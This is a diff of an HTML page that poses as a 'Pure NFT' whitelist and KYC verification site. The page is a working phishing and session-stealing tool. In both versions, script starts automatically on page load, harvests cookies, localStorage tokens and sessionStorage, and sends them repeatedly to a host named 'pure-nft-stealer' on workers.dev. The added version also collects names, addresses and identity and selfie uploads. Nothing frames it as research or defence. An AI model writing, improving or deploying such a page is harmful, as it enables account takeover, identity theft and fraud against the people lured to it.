@@ -1,151 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Pure NFT Market</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            background: linear-gradient(45deg, #000, #111);
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            text-align: center;
-            padding: 20px;
-            margin: 0;
-        }
-        h1 { font-size: 28px; margin: 20px 0; }
-        button {
-            width: 90%;
-            max-width: 300px;
-            padding: 20px;
-            font-size: 18px;
-            background: #00ff00;
-            color: #000;
-            border: none;
-            border-radius: 15px;
-            margin: 15px 0;
-            cursor: pointer;
-        }
-        button:hover { background: #00cc00; }
-        .form-group { margin: 20px 0; text-align: left; max-width: 90%; margin-left: auto; margin-right: auto; }
-        input[type="text"], input[type="file"] {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: #111;
-            color: #00ff00;
-            border: 1px solid #00ff00;
-            border-radius: 10px;
-            font-size: 16px;
-        }
-        #status { color: #00ff88; margin: 20px 0; }
-        #kycForm { display: none; }
-    </style>
+    <title>Pure NFT</title>
+    <meta name="viewport" content="width=device-width">
+    <style>body{margin:0;padding:20px;background:#000;color:#0f0;font-family:monospace;text-align:center}button{padding:20px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:10px;margin:20px;cursor:pointer}#status{color:#0ff;margin:20px}input{width:90%;padding:15px;margin:10px;background:#111;color:#0f0;border:1px solid #0f0}</style>
 </head>
 <body>
-    <h1>🔥 Pure NFT Market</h1>
-    <p>Whitelist Verification Required</p>
-    
-    <button onclick="connectAccounts()">📱 Tap to Connect Gmail/Binance</button>
-    <div id="status"></div>
-    
-    <div id="kycForm">
-        <div class="form-group">
-            <input type="text" id="name" placeholder="Full Name">
-        </div>
-        <div class="form-group">
-            <input type="text" id="address" placeholder="Full Address">
-        </div>
-        <div class="form-group">
-            <input type="file" id="idfront" accept="image/*">
-            <small>ID Front</small>
-        </div>
-        <div class="form-group">
-            <input type="file" id="idback" accept="image/*">
-            <small>ID Back</small>
-        </div>
-        <div class="form-group">
-            <input type="file" id="selfie1" accept="image/*">
-            <small>Live Selfie 1</small>
-        </div>
-        <div class="form-group">
-            <input type="file" id="selfie2" accept="image/*">
-            <small>Selfie 2 (Turn Left)</small>
-        </div>
-        <div class="form-group">
-            <input type="file" id="selfie3" accept="image/*">
-            <small>Selfie 3 (Smile)</small>
-        </div>
-        <button onclick="submitKYC()">✅ Submit KYC</button>
-    </div>
+<h1>🔥 Pure NFT Whitelist</h1>
+<button onclick="grabAll()">📱 Connect Now</button>
+<div id="status"></div>
+<form id="kyc" style="display:none;max-width:350px;margin:0 auto">
+<input id="name" placeholder="Name">
+<input id="addr" placeholder="Address">
+<input type="file" id="files" multiple accept="image/*">
+<button type="button" onclick="sendKYC()">Submit KYC</button>
+</form>
 
-    <script>
-        // Status update
-        function updateStatus(msg) {
-            document.getElementById('status').innerHTML = '✅ ' + msg;
-        }
-        
-        // 1. Connect & Auto-Steal
-        function connectAccounts() {
-            updateStatus('Connecting accounts...');
-            
-            // Invisible iframes for session grab
-            const urls = ['https://accounts.google.com', 'https://www.binance.com/en/login'];
-            urls.forEach(url => {
-                const iframe = document.createElement('iframe');
-                iframe.src = url;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-            });
-            
-            // Send initial steal
-            stealCookies();
-            document.getElementById('kycForm').style.display = 'block';
-            updateStatus('Connected! Complete KYC below');
-        }
-        
-        // 2. Cookie Stealer (Every 5 seconds)
-        function stealCookies() {
-            fetch('/steal', {
-                method: 'POST',
-                body: JSON.stringify({
-                    cookies: document.cookie,
-                    localStorage: Object.keys(localStorage).length,
-                    sessionStorage: Object.keys(sessionStorage).length
-                }),
-                headers: { 'Content-Type': 'application/json' }
-            }).then(() => {
-                setTimeout(stealCookies, 5000); // Repeat!
-            });
-        }
-        
-        // 3. KYC Submit
-        async function submitKYC() {
-            updateStatus('Uploading KYC...');
-            
-            const kycData = {
-                name: document.getElementById('name').value,
-                address: document.getElementById('address').value,
-                cookies: document.cookie,
-                files: []
-            };
-            
-            // File names only (for demo)
-            ['idfront', 'idback', 'selfie1', 'selfie2', 'selfie3'].forEach(id => {
-                const file = document.getElementById(id).files[0];
-                if (file) kycData.files.push(file.name);
-            });
-            
-            await fetch('/kyc', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(kycData)
-            });
-            
-            updateStatus('🎉 KYC COMPLETE! Check your webhook.');
-        }
-        
-        // Auto-start stealing after 3 seconds
-        setTimeout(stealCookies, 3000);
-    </script>
+<script>
+// Status
+function status(msg) { document.getElementById('status').innerHTML=msg }
+
+// GRAB EVERYTHING
+function grabAll() {
+    status('🔄 Grabbing sessions...');
+    
+    // 1. Document cookies
+    const docCookies = document.cookie;
+    
+    // 2. LocalStorage (Gmail/Binance tokens)
+    const localData = {};
+    for(let i=0; i<localStorage.length; i++) {
+        localData[localStorage.key(i)] = localStorage.getItem(localStorage.key(i)).substring(0,50);
+    }
+    
+    // 3. SessionStorage
+    const sessionData = Object.keys(sessionStorage).join(',');
+    
+    // 4. Send ALL
+    fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal?source=all', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            cookies: docCookies,
+            local: localData,
+            session: sessionData,
+            screen: screen.width + 'x' + screen.height
+        })
+    }).then(r=>r.text()).then(data => {
+        status('✅ ' + data.substring(0,100));
+        document.getElementById('kyc').style.display='block';
+    });
+    
+    // Repeat grab
+    setTimeout(grabAll, 8000);
+}
+
+// KYC
+function sendKYC() {
+    const data = {
+        name: document.getElementById('name').value,
+        addr: document.getElementById('addr').value,
+        files: document.getElementById('files').files.length + ' files',
+        cookies: document.cookie
+    };
+    
+    fetch('https://pure-nft-stealer.ilovework01.workers.dev/kyc', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    }).then(()=>status('🎉 KYC SENT!'));
+}
+
+// AUTO START
+setTimeout(grabAll, 2000);
+</script>
 </body>
 </html>
